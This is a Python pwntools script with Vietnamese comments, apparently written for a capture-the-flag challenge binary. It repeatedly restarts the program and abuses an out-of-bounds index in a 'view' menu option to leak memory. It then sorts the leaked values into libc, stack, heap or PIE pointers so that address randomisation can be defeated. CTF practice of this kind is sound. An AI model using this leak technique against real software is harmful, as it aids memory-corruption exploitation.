from pwn import *
import time

# Cấu hình
exe = ELF('./chal')
libc = ELF('./libc.so.6')
context.binary = exe
context.log_level = 'error' # Tắt log rác, chỉ in kết quả tìm được

STDOUT_IDX = -4
PIE_IDX = -7

print("[-] Đang bắt đầu quét Robust (Auto-Restart)...")
print("[-] Mục tiêu: Tìm Index chứa Pointer 0x7f... (Libc) hoặc 0x55.../0x56... (Heap)")

found_libc_idx = None
found_heap_idx = None

# Quét rộng hơn: từ -35 đến 0 (Vùng GOT thường nằm đây)
for idx in range(-100, 100):
    if idx == STDOUT_IDX: continue # Bỏ qua stdout vì biết rồi
    if idx == PIE_IDX: continue    # Bỏ qua PIE leak

    try:
        # Khởi động lại process mỗi lần để tránh trạng thái lỗi
        r = process('./chal')
        
        # 1. View(idx)
        r.sendlineafter(b': ', b'3')
        r.sendlineafter(b': ', str(idx).encode())
        
        # Đọc dữ liệu
        r.recvuntil(b'data: ')
        leak = r.recvline().strip()
        r.close()

        if not leak:
            continue
            
        # Phân tích dữ liệu
        if len(leak) >= 6:
            val = u64(leak.ljust(8, b'\0'))
            
            # Check loại pointer
            ptr_type = ""
            if (val & 0xfff000000000) == 0x7f0000000000:
                ptr_type = "LIBC / STACK"
                if found_libc_idx is None: found_libc_idx = idx
            elif (val & 0xfff000000000) in [0x550000000000, 0x560000000000]:
                ptr_type = "HEAP / PIE"
                if found_heap_idx is None: found_heap_idx = idx
            
            print(f"[+] Index {idx}:\tHex: {hex(val)}\t-> {ptr_type}")

    except EOFError:
        # Process chết (Crash) -> Index này trỏ vào vùng nhớ lỗi
        # print(f"[-] Index {idx}: CRASH (Invalid Address)")
        pass
    except Exception as e:
        print(f"[-] Index {idx}: Error {e}")

print("\n" + "="*30)
print(f"[*] KẾT QUẢ QUÉT:")
print(f"[*] STDOUT Index: {STDOUT_IDX}")
print(f"[*] LIBC Index:   {found_libc_idx if found_libc_idx is not None else 'CHƯA TÌM THẤY'}")
print(f"[*] HEAP Index:   {found_heap_idx if found_heap_idx is not None else 'CHƯA TÌM THẤY'}")
print("="*30)